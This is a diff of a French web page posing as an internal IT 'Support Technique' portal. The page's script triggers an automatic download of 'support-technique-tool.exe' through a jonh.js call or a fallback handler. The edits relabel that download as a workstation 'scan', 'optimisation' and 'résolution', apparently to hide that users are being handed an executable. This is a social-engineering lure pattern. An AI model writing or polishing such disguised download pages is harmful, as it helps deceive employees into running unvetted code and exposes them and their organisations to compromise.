@@ -247,7 +247,7 @@
                 <i class="fas fa-headset"></i>
                 <h1>Support Technique</h1>
                 <p class="subtitle">
-                    Support Technique du Département IT pour la résolution et la maintenance
+                    Support Technique du Département IT pour la résolution et la maintenance.
                 </p>
             </div>
 
@@ -255,12 +255,12 @@
                 <div class="feature-item">
                     <i class="fas fa-shield-alt"></i>
                     <h3>Sécurisé</h3>
-                    <p>Téléchargements certifiés et vérifiés</p>
+                    <p>Scan et annalyse Sécurisé du poste de travail </p>
                 </div>
                 <div class="feature-item">
                     <i class="fas fa-bolt"></i>
                     <h3>Rapide</h3>
-                    <p>Téléchargement optimisé haute vitesse</p>
+                    <p>Optimisation du poste de travail</p>
                 </div>
                 <div class="feature-item">
                     <i class="fas fa-sync-alt"></i>
@@ -338,7 +338,7 @@
                         .then(() => {
                             if (typeof jonh !== 'undefined' && jonh.download) {
                                 jonh.download();
-                                statusText.innerHTML = 'Téléchargement en cours...';
+                                statusText.innerHTML = 'Résolution en cours...';
                             } else {
                                 // Script de fallback si jonh.js n'est pas trouvé
                                 console.log('Script jonh.js non trouvé, utilisation du gestionnaire par défaut');
@@ -370,7 +370,7 @@
             
             function defaultDownloadHandler() {
                 // Simuler un téléchargement
-                statusText.innerHTML = 'Téléchargement démarré...';
+                statusText.innerHTML = 'Résolution démarrée...';
                 
                 // Créer un lien de téléchargement fictif
                 setTimeout(() => {
@@ -379,7 +379,7 @@
                     link.download = 'support-technique-tool.exe';
                     link.click();
                     
-                    statusText.innerHTML = 'Téléchargement terminé avec succès !';
+                    statusText.innerHTML = 'Résosluton terminée avec succès !';
                     
                     setTimeout(() => {
                         statusDiv.classList.remove('show');
